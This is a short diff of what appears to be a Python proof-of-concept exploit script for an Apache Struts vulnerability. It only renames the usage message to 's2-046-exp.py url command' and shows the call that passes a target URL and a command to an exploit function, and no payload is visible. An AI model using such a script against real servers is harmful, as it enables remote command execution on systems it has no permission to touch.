@@ -48,7 +48,7 @@ def exploit(url, cmd):
 if __name__ == '__main__':
 
     if len(sys.argv) != 3:
-        print "Usage : python S2-052-POC.py http://127.0.0.1/orders/ url command "
+        print "Usage : python s2-046-exp.py url command "
     else:
         print " "
     exploit(sys.argv[1], sys.argv[2])
